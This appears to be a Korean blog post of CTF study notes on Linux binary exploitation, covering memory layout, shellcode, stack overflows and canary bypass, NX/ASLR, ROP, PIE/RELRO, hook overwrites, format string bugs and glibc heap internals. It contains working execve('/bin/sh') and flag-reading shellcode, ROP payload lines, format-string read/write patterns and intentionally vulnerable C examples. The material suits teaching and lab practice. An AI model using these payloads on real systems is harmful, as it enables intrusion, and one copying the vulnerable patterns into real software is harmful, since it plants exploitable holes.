---
title: "시스템 해킹 기초"
date: 2025-01-03 00:00:00 +0900
categories: [CTF]
tags: [pwnable]
permalink: /posts/dr-pwnable-basic/
---
## 목차
- [1. 리눅스 메모리 레이아웃](#리눅스-메모리-레이아웃)
- [2. 쉘 코드](#쉘-코드)
- [3. 스택 BOF](#스택-버퍼-오버플로우)
- [4. NX & ASLR](#nx--aslr)
- [5. PIE & RELRO](#pie--relro)
- [6. 메모리 커럽션](#메모리-커럽션)
  - [6.1 Use After Free](#use-after-free-1)
  - [6.2 Double Free Bug](#double-free-bug)


## 리눅스 메모리 레이아웃
리눅스는 프로세스의 메모리를 크게 5개의 세그먼트로 나눕니다 -> (code, data, bss, heap, stack)

### Code
실행 가능한 기계어 코드를 위한 세그먼트입니다. 텍스트 세그먼트라고도 알려져 있습니다. <br>
대부분의 경우 실행 권한이 없습니다.

### Data
컴파일 시 값이 이미 고정된 전역 변수와 상수를 위한 세그먼트입니다. <br>
보통 읽기 권한을 가지고 있습니다. 데이터 세그먼트는 다시 두 개의 세그먼트로 나뉩니다: 쓰기 가능, 쓰기 불가능

쓰기 가능: data 세그먼트
쓰기 불가능: rodata 세그먼트

### Bss
컴파일 시 값이 아직 고정되지 않은 전역 변수와 상수를 위한 세그먼트입니다.<br>
프로그램이 시작되면 이 세그먼트는 0으로 초기화됩니다.  <br>
보통 '읽기', '쓰기' 권한을 가지고 있습니다.

### Stack
함수의 매개변수와 지역 변수 같은 임시 변수를 위한 세그먼트입니다.  <br>
보통 '스택 프레임'이라는 단위로 사용됩니다. '낮은 주소'를 향해 성장합니다.

### Heap
힙 데이터를 위한 세그먼트입니다. 런타임 중에 동적으로 할당됩니다. <br>
보통 '읽기', '쓰기' 권한을 가지고 있습니다.

## 쉘 코드
공격자가 rip를 제어할 수 있다면, 공격자는 임의의 어셈블리 코드를 실행할 수 있습니다.

### ORW 쉘 코드

아래 C 코드는 쉘 코드가 무엇을 하는지 보여주는 의사 코드입니다.

```c
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```

| syscall | rax | arg0 (rdi)      | arg1 (rsi) | arg2 (rdx)    |
|---------|-----|-----------------|------------|---------------|
| read    | 0x0 | unsigned int fd | char *buf  | size_t count  |
| write   | 0x1 | unsigned int fd | char *buf  | size_t count  |
| open    | 0x2 | char *filename  | int flag   | umode_t mode  |

#### 1. int fd = open("/tmp/flag", RD_ONLY, NULL)
먼저 "/tmp/flag" 문자열이 메모리에 있어야 합니다. -> push <br>
하지만 push 연산은 8바이트 단위로 작동합니다. 따라서 0x67을 push한 다음 0x616c662f706d742f를 push합니다. <br>

리틀 엔디안으로 "/tmp/flag": 0x67616c662f706d742f <br>

O_RDONLY = 0 -> rsi를 0으로 설정 <br>
mode -> 의미 없음, rdx를 0으로 설정 <br>
rax -> 0x2(open) <br>

```
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

#### 2. read(fd, buf, 0x30)
'open'으로 얻은 파일 디스크립터 번호가 rax로 들어갑니다. 따라서 'mov rdi, rax' <br>
```
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

#### 3. write(1, buf, 0x30)
표준 출력(stdout) -> rdi를 0x1로 설정 <br>
rsi, rdx는 그대로 유지 <br>

```
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

ELF로 컴파일하는 방법
```
// Compile: gcc -o orw orw.c -masm=intel

__asm__(
    ".global run_sh\n"
    "run_sh:\n"

    "push 0x67\n"
    "mov rax, 0x616c662f706d742f \n"
    "push rax\n"
    "mov rdi, rsp    # rdi = '/tmp/flag'\n"
    "xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
    "xor rdx, rdx    # rdx = 0\n"
    "mov rax, 2      # rax = 2 ; syscall_open\n"
    "syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    "mov rdi, rax      # rdi = fd\n"
    "mov rsi, rsp\n"
    "sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
    "mov rdx, 0x30     # rdx = 0x30     ; len\n"
    "mov rax, 0x0      # rax = 0        ; syscall_read\n"
    "syscall           # read(fd, buf, 0x30)\n"
    "\n"
    "mov rdi, 1        # rdi = 1 ; fd = stdout\n"
    "mov rax, 0x1      # rax = 1 ; syscall_write\n"
    "syscall           # write(fd, buf, 0x30)\n"
    "\n"
    "xor rdi, rdi      # rdi = 0\n"
    "mov rax, 0x3c	   # rax = sys_exit\n"
    "syscall		   # exit(0)");

void run_sh();

int main() { run_sh(); }
```

### execve 쉘 코드

execve 시스템 콜만 사용합니다: execve("/bin/sh",null,null) <br>

| syscall | rax  | arg0 (rdi)     | arg1 (rsi)      | arg2 (rdx)        |
|---------|------|----------------|-----------------|-------------------|
| execve  | 0x3b | char *filename | char *argv      | char *const *envp |

```
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

### 쉘 코드 추출하는 방법

바이트 코드(opcode) 형태로 쉘코드를 추출하는 방법입니다.

```
$ objdump -d shellcode.o
shellcode.o:     file format elf32-i386
Disassembly of section .text:
00000000 <_start>:
   0:	31 c0                	xor    %eax,%eax
   2:	50                   	push   %eax
   3:	68 2f 2f 73 68       	push   $0x68732f2f
   8:	68 2f 62 69 6e       	push   $0x6e69622f
   d:	89 e3                	mov    %esp,%ebx
   f:	31 c9                	xor    %ecx,%ecx
  11:	31 d2                	xor    %edx,%edx
  13:	b0 0b                	mov    $0xb,%al
  15:	cd 80                	int    $0x80
```

xxd 명령어를 사용할 수 있습니다.

```
$ objcopy --dump-section .text=shellcode.bin shellcode.o
$ xxd shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....
```

## 스택 버퍼 오버플로우

buffer: 임시 데이터 저장소 <br>

버퍼 오버플로우: 버퍼의 크기보다 큰 데이터가 들어갈 때 발생합니다.

### 1. 데이터 변조

```c
int check_auth(char *password) {
    int auth = 0;
    char temp[16];

    strncpy(temp, password, strlen(password));

    if(!strcmp(temp, "SECRET_PASSWORD"))
        auth = 1;

    return auth;
}
```

'password'가 16바이트보다 길면 -> 버퍼 오버플로우 발생 <br>

'auth' 변수는 'temp' 버퍼 뒤에 위치하므로 오버플로우가 발생하면 <br>
auth의 값을 변조할 수 있습니다.

### 2. 데이터 유출

C 언어에서 일반적인 문자열은 널 바이트로 종료됩니다. <br>
버퍼 오버플로우를 사용하여 널 바이트를 덮어쓸 수 있다면 데이터 유출로 이어질 수 있습니다.

```c
char secret[16] = "secret message";
char barrier[4] = {};
char name[8] = {};
memset(barrier, 0, 4);
printf("Your name: ");
read(0, name, 12);
printf("Your name is %s.", name);
```

### 3. 제어 흐름 조작

caller가 callee를 호출할 때 리턴 주소를 push합니다. callee가 리턴할 때 리턴 주소를 pop하고 점프합니다. <br>
버퍼 오버플로우를 사용하면 리턴 주소를 수정할 수 있습니다.

```c
void win() {
    printf("You won!\n");
}

int main(void) {
    char buf[8];
    printf("Overwrite return address with %p:\n", &win);
    read(0, buf, 32);
    return 0;
}
```

buf + saved_rbp(8바이트) + ret(8바이트) -> 리턴 주소를 덮어쓸 수 있습니다.

### 스택 카나리

스택 카나리: 스택 버퍼와 리턴 주소 사이에 랜덤 값을 삽입합니다. 함수의 에필로그에서 <br>
이 값의 변조 여부를 확인합니다. 변조되었다면 프로세스가 종료됩니다.

```
+  mov    rax,QWORD PTR fs:0x28
+  mov    QWORD PTR [rbp-0x8],rax
+  xor    eax,eax
+  lea    rax,[rbp-0x10]
-  lea    rax,[rbp-0x8]
   mov    edx,0x20
   mov    rsi,rax
   mov    edi,0x0
   call   read@plt
   mov    eax,0x0
+  mov    rcx,QWORD PTR [rbp-0x8]
+  xor    rcx,QWORD PTR fs:0x28
+  je     0x6f0 <main+70>
+  call   __stack_chk_fail@plt
```

### 카나리 동적 분석

#### 카나리 삽입

```
pwndbg> ni
   0x5555555546b2 <main+8>     mov    rax, qword ptr fs:[0x28] <0x5555555546aa>
   0x5555555546bb <main+17>    mov    qword ptr [rbp - 8], rax
 ► 0x5555555546bf <main+21>    xor    eax, eax
pwndbg> x/gx $rbp-0x8
0x7fffffffe238:	0xf80f605895da3c00
```

**fs:0x28**에서 데이터를 가져와 **rbp-0x8**에 저장합니다. <br>

fs: 리눅스는 fs(세그먼트 레지스터)를 TLS(스레드 로컬 스토리지)의 포인터로 사용합니다. <br>
TLS: 프로세스 실행 시 필요한 다양한 데이터를 저장합니다(카나리 포함).

#### 카나리 검사

```
0x5555555546dc <main+50>    mov    rcx, qword ptr [rbp - 8] <0x7ffff7af4191>
0x5555555546e0 <main+54>    xor    rcx, qword ptr fs:[0x28]
0x5555555546e9 <main+63>    je     main+70 <main+70>
0x5555555546eb <main+65>    call   __stack_chk_fail@plt <__stack_chk_fail@plt>
```

두 값을 xor합니다: **rbp-0x8**의 데이터와 **fs:0x28**의 데이터 <br>
두 값이 같지 않으면: **__stack_chk_fail**을 호출하고 종료합니다.

### 카나리 우회

#### TLS 읽기, 쓰기

TLS의 주소는 매번 변경됩니다. 하지만 런타임 중에 TLS에 접근할 수 있다면 카나리 값을 읽거나 <br>
카나리를 덮어쓸 수 있습니다.

#### 카나리 유출

```c
int main() {
  char memo[8];
  char name[8];

  printf("name : ");
  read(0, name, 64);
  printf("hello %s\n", name);

  printf("memo : ");
  read(0, memo, 64);
  printf("memo %s\n", memo);
  return 0;
}
```

**name** 버퍼 오버플로우 -> 카나리의 1바이트(널 바이트) 덮어쓰기 -> 카나리 유출 <br>

이 카나리 값으로 name(8바이트) + canary(8바이트) + rbp(8바이트) + ret(8바이트)를 덮어쓸 수 있습니다.

## NX & ASLR

### NX

NX: No-eXecutable -> 실행을 위한 메모리 공간과 쓰기를 위한 메모리 공간을 분리합니다. <br>

NX가 활성화되면...

```
         Start                End Perm     Size Offset File
      0x400000           0x401000 r--p     1000      0 /home/dreamhack/nx
      0x401000           0x402000 r-xp     1000   1000 /home/dreamhack/nx
      0x402000           0x403000 r--p     1000   2000 /home/dreamhack/nx
      0x403000           0x404000 r--p     1000   2000 /home/dreamhack/nx
      0x404000           0x405000 rw-p     1000   3000 /home/dreamhack/nx
0x7ffff7d7f000     0x7ffff7d82000 rw-p     3000      0 [anon_7ffff7d7f]
0x7ffff7d82000     0x7ffff7daa000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7daa000     0x7ffff7f3f000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f3f000     0x7ffff7f97000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f97000     0x7ffff7f9b000 r--p     4000 214000 /usr/lib/x86_64-linux-gnu/libc.so.6
0x7ffff7f9b000     0x7ffff7f9d000 rw-p     2000 218000 /usr/lib/x86_64-linux-gnu/libc.so.6
```

코드 섹션을 제외하고 실행 권한이 없습니다.

### ASLR

ASLR: 바이너리가 실행될 때마다 스택, 힙, 공유 라이브러리 등을 임의의 메모리 주소에 할당합니다. <br>

```
$ ./addr
buf_stack addr: 0x7ffcd3fcffc0
buf_heap addr: 0xb97260
libc_base addr: 0x7fd7504cd000
printf addr: 0x7fd750531f00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffe4c661f90
buf_heap addr: 0x176d260
libc_base addr: 0x7ffad9e1b000
printf addr: 0x7ffad9e7ff00
main addr: 0x400667
$ ./addr
buf_stack addr: 0x7ffcf2386d80
buf_heap addr: 0x840260
libc_base addr: 0x7fed2664b000
printf addr: 0x7fed266aff00
main addr: 0x400667
```

**main**(코드 섹션)을 제외한 모든 함수의 주소가 항상 변경됩니다. <br>
**libc_base**와 **printf** 주소의 하위 12비트는 변경되지 않습니다(리눅스의 페이징 때문). <br>
**libc_base**와 **printf** 사이의 거리는 항상 같습니다.

### 라이브러리

라이브러리: 효율성을 위해 자주 사용되는 함수를 공통으로 공유할 수 있게 합니다. <br>

### 링크

링킹 -> 일반적으로 컴파일의 마지막 단계입니다. 프로그램이 라이브러리의 함수를 사용한다면 그 함수들이 실제로 라이브러리에 링크됩니다. <br>

리눅스에서 C 코드 => 전처리, 컴파일, 어셈블리 => ELF 오브젝트 파일로 변환됩니다.

```
gcc -c hello-world.c -o hello-world.o
```

오브젝트 파일은 실행 가능한 형식을 가지지만 함수의 위치에 대한 정보는 없습니다. <br>
링킹 과정에서 링커는 프로그램에서 사용된 심볼과 실제 정의를 매칭합니다. <br>

동적 링킹: 바이너리가 실행될 때 동적 라이브러리가 프로세스 메모리에 매핑됩니다. <br>
정적 링킹: 정적으로 링크된 바이너리는 라이브러리의 모든 함수를 포함합니다 -> 외부 라이브러리가 필요 없습니다.

### PLT & GOT

PLT(Procedure Linkage Table), GOT(Global Offset Table) -> 동적으로 링크된 심볼을 찾는 데 사용됩니다. <br>
GOT -> **해결된** 함수의 주소를 위한 테이블입니다. <br>

처음에 GOT는 비어 있습니다 -> PLT가 동적 링커를 호출하고 실제 주소로 GOT를 작성합니다. <br>

### Return To Library

libc -> system, execve 같은 함수들이 존재합니다. <br>
NX를 우회하기 위해 libc 함수를 사용합니다(실행 권한을 가진 섹션). <br>

아래와 같이 리턴 주소를 덮어쓸 수 있습니다.

```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

### Return Oriented PRogramming

기술적으로 말하면 **system** 함수는 PLT에 기록되지 않습니다. <br>
이를 사용하려면 매핑된 libc의 주소를 찾고 함수의 주소를 계산해야 합니다. <br>
<br>
라이브러리 파일 -> 전체 파일이 매핑됩니다 -> 모든 함수가 프로세스 메모리에 매핑됩니다. <br>

```
# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)
```

## PIE & RELRO

### PIE

PIE(Position-Independant Executable): 코드 섹션에 ASLR을 적용합니다. <br><br>

```
$ ./pie
buf_stack addr: 0x7ffc85ef37e0
buf_heap addr: 0x55617ffcb260
libc_base addr: 0x7f0989d06000
printf addr: 0x7f0989d6af00
main addr: 0x55617f1297ba
$ ./pie
buf_stack addr: 0x7ffe9088b1c0
buf_heap addr: 0x55e0a6116260
libc_base addr: 0x7f9172a7e000
printf addr: 0x7f9172ae2f00
main addr: 0x55e0a564a7ba
$ ./pie
buf_stack addr: 0x7ffec6da1fa0
buf_heap addr: 0x5590e4175260
libc_base addr: 0x7fdea61f2000
printf addr: 0x7fdea6256f00
main addr: 0x5590e1faf7ba
```
<br>
PIE가 적용되면 코드 가젯을 사용하거나 데이터 섹션에 접근하려면 코드 베이스(PIE 베이스)를 찾아야 합니다. <br>

### RELRO

RELRO(RELocation Read-Only): 데이터 섹션에서 불필요한 쓰기 권한을 제거합니다. <br><br>

Full RELRO: **data**와 **bss**에만 쓰기 권한을 가집니다. <br>
Full RELRO가 적용되면 모든 라이브러리 함수가 바이너리 로딩 중에 바인딩됩니다.

### Hook Overwrite

Glibc(2.33 버전 이전)에는 **malloc**과 **free**를 위한 hook 함수 포인터가 있습니다. <br>

One-gadget -> 단일 가젯으로 쉘을 실행할 수 있지만 모든 제약 조건을 만족해야 합니다. <br>

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__libc_malloc|__libc_free|__libc_realloc"
   463: 00000000000970e0   923 FUNC    GLOBAL DEFAULT   13 __libc_malloc@@GLIBC_2.2.5
   710: 000000000009d100    33 FUNC    GLOBAL DEFAULT   13 __libc_reallocarray@@GLIBC_PRIVATE
  1619: 0000000000098ca0  1114 FUNC    GLOBAL DEFAULT   13 __libc_realloc@@GLIBC_2.2.5
  1889: 00000000000979c0  3633 FUNC    GLOBAL DEFAULT   13 __libc_free@@GLIBC_2.2.5
  1994: 000000000019a9d0   161 FUNC    GLOBAL DEFAULT   14 __libc_freeres@@GLIBC_2.2.5
```

libc에서 hook 함수는 디버깅 목적으로 정의되어 있습니다(최신 버전에서는 보안상의 이유로 제거됨). <br>

**malloc**은 먼저 **__malloc_hook**를 확인하고 존재한다면 hook이 가리키는 함수를 먼저 실행합니다. <br>

```c
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
}
```

hook들은 libc.so에 정의되어 있습니다.

```
$ readelf -s /lib/x86_64-linux-gnu/libc-2.27.so | grep -E "__malloc_hook|__free_hook|__realloc_hook"
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5
  1132: 00000000003ebc30     8 OBJECT  WEAK   DEFAULT   34 __malloc_hook@@GLIBC_2.2.5
  1544: 00000000003ebc28     8 OBJECT  WEAK   DEFAULT   34 __realloc_hook@@GLIBC_2.2.5
```

이러한 hook들은 **bss**, **data** 섹션에 위치합니다 -> 덮어쓸 수 있습니다. <br> <br>
hook 함수가 실행될 때 매개변수도 함께 전달됩니다 -> **malloc("/bin/sh")**와 같이 실행할 수 있습니다. <br>

## 메모리 커럽션

### Out of Bounds

OOB: 인덱스 값이 0보다 작거나 배열 크기를 초과할 때 발생합니다. <br>

OOB -> 임의 읽기, 쓰기로 이어질 수 있습니다.

### Format String Bug

Format specifier: %n, %c, %s.... <br>
%n: 출력된 문자의 수를 계산합니다. <br>

hh: char 크기, h: short int 크기, l: long int 크기, ll: long long int 크기 <br>

```c
scanf("%s", format);
printf(format);
```

그런 다음 **%p/%p/%p/%p/%p/%p/%p/%p**를 입력합니다.

```
$ ./fsb_stack_read
Format: %p/%p/%p/%p/%p/%p/%p/%p
0xa/(nil)/0x7f4dad0bbaa0/(nil)/0x55f04ffdc6b0/0x7025207025207025/0x2520702520702520/0x2070252070252070
```

x64-64 규약에 따라 rdi 다음에 **rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10]**이 출력됩니다. <br>

이를 사용하여 임의 읽기, 쓰기를 수행할 수 있습니다. <br>

읽기 -> %[n]$s , 쓰기 -> %[n]$n <br>

### Use After Free

#### ptmalloc2

ptmalloc2: 리눅스 메모리 할당자입니다. <br>

주요 기능: <br>
  1. 메모리 낭비 방지
  2. 빠른 메모리 재사용
  3. 메모리 단편화 방지

#### Chunk

청크 구조

![Chunk Structure](/assets/img/posts/CTF/dreamhack/pwnable/chunk.png)

**사용 중인** 청크와 **해제된** 청크의 헤더는 다릅니다. <br>

사용 중인 청크: **fd**, **bk**를 사용하지 않습니다. 그 영역을 데이터로 사용합니다. <br>

| Name      | Size     | Meaning                                                                                                 |
|-----------|----------|---------------------------------------------------------------------------------------------------------|
| prev_size | 8 bytes  | 바로 앞(인접한) 청크의 크기입니다. 이전 청크를 찾고 병합하는 데 사용됩니다.   |
| size      | 8 bytes  | 현재 청크의 크기입니다(헤더 포함). 64비트 시스템에서 헤더는 보통 16바이트를 추가합니다. |
| flags     | 3 bits   | 청크 관리 플래그에 사용되는 `size`의 하위 비트입니다. 일반적인 플래그: 할당된 arena (A), Mmap'd (M), Prev in use (P). |
| fd        | 8 bytes  | free 리스트에서 다음 청크를 가리킵니다. 해제된 청크에만 존재합니다.                                 |
| bk        | 8 bytes  | free 리스트에서 이전 청크를 가리킵니다. 해제된 청크에만 존재합니다.                             |

#### Bin

bin: 사용된 청크를 저장하는 객체로 메모리 낭비 방지와 빠른 재사용을 위한 것입니다. <br>

![bin structure](/assets/img/posts/CTF/dreamhack/pwnable/bin.png)

##### smallbin

**32 byte ~ 1024 byte**

각 smallbin은 같은 크기의 청크를 포함합니다. 각 인덱스마다 청크의 크기가 16바이트씩 커집니다. smallbin[0]: 32, smallbin[61]:1008.. <br>

smallbin: 순환 이중 연결 리스트, **FIFO**입니다. <br>

**unlink**: 리스트에서 청크를 추가하거나 제거하는 절차입니다. <br>

smallbin에서 메모리상에서 인접한 두 청크가 해제되면 **병합**됩니다. <br>

##### fastbin

**32 byte ~ 176 byte**

10개의 fastbin이 있습니다. 리눅스는 7개만 사용합니다(**32~128**). **LIFO**(unlink 없음, 단일 연결 리스트)입니다. <br>

마지막으로 해제된 청크가 먼저 할당됩니다. 병합 없습니다.

##### largebin

**1024byte~**

이중 연결 리스트, **unlink**입니다. 63개의 largebin이 있습니다. 병합이 발생합니다.

##### unsortedbin

하나만 있습니다. fastbin에 들어가지 않는 청크는 모두 unsortedbin에 저장됩니다. <br>

Unsortedbin: 순환 이중 연결 리스트입니다. <br>

smallbin 크기 청크 할당이 요청되면: fastbin, smallbin 검색 -> unsortedbin <br>

largebin 크기 청크 할당이 요청되면: 먼저 unsortedbin 검색 -> unsortedbin을 검색할 때... 청크를 해당 bin으로 정렬합니다. <br>

##### arena

arena: fastbin, smallbin, largebin 등에 대한 정보를 보유하는 객체입니다. <br>

glibc 2.26에서 tcache가 추가로 도입되었습니다.

##### tcache

**32byte~1024byte**

tcache: thread local cache입니다. 각 스레드마다 독립적으로 할당되는 캐시 저장소를 의미합니다. <br>

각 스레드는 64개의 tcache를 가집니다. **LIFO 단일 연결 리스트**입니다. 하나의 tcache는 같은 크기의 청크를 포함합니다. 리눅스에서 각 tcache는 최대 7개의 청크를 포함할 수 있습니다. <br>

#### Use After Free

Use-After-Free: 해제된 포인터를 제대로 초기화하지 않는 것, 초기화되지 않은 해제된 메모리를 재할당하는 것입니다. <br>

Dangling Pointer: 유효하지 않은 메모리를 가리키는 포인터입니다. 포인터가 초기화되지 않으면 dangling pointer가 됩니다. <br>

dangling pointer를 사용하면 **Double free**가 발생할 수 있습니다.

#### Double Free Bug

double free = **free 리스트**에 같은 청크를 여러 번 삽입하는 것 -> 중복됩니다. <br>

fd: 다음 청크, bk: 이전 청크 -> fd, bk가 손상될 수 있다면 임의 주소 읽기, 쓰기로 이어질 수 있습니다. <br>

#### tcache DFB 완화

tcache_entry에서 **key**가 추가된 것을 찾을 수 있습니다.
```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;
```

tcache_put: 해제된 청크를 tcache에 삽입합니다. **e->key**를 **tcache**(tcache_perthread를 가리킴)로 설정합니다.
```c
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;

  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

tcache_get: tcache에 저장된 청크를 할당하는 데 사용되는 함수입니다. **e->key**를 NULL로 설정합니다.
```c
static __always_inline void *
tcache_get_n (size_t tc_idx, tcache_entry **ep)
{
  tcache_entry *e;
  if (ep == &(tcache->entries[tc_idx]))
    e = *ep;
  else
    e = REVEAL_PTR (*ep);

  if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");

  if (ep == &(tcache->entries[tc_idx]))
      *ep = REVEAL_PTR (e->next);
  else
    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));

  --(tcache->counts[tc_idx]);
  e->key = 0;
  return (void *) e;
}
```

tcache_free: 재할당된 청크의 key가 **tcache_key**이면 프로그램을 중단합니다.
```c
static inline bool
tcache_free (mchunkptr p, INTERNAL_SIZE_T size)
{
  bool done = false;
  size_t tc_idx = csize2tidx (size);
  if (tcache != NULL && tc_idx < mp_.tcache_bins)
    {
      /* Check to see if it's already in the tcache.  */
      tcache_entry *e = (tcache_entry *) chunk2mem (p);

      /* This test succeeds on double free.  However, we don't 100%
	 trust it (it also matches random payload data at a 1 in
	 2^<size_t> chance), so verify it's not an unlikely
	 coincidence before aborting.  */
      if (__glibc_unlikely (e->key == tcache_key))
	tcache_double_free_verify (e, tc_idx);

      if (tcache->counts[tc_idx] < mp_.tcache_count)
	{
	  tcache_put (p, tc_idx);
	  done = true;
	}
    }
  return done;
}
```
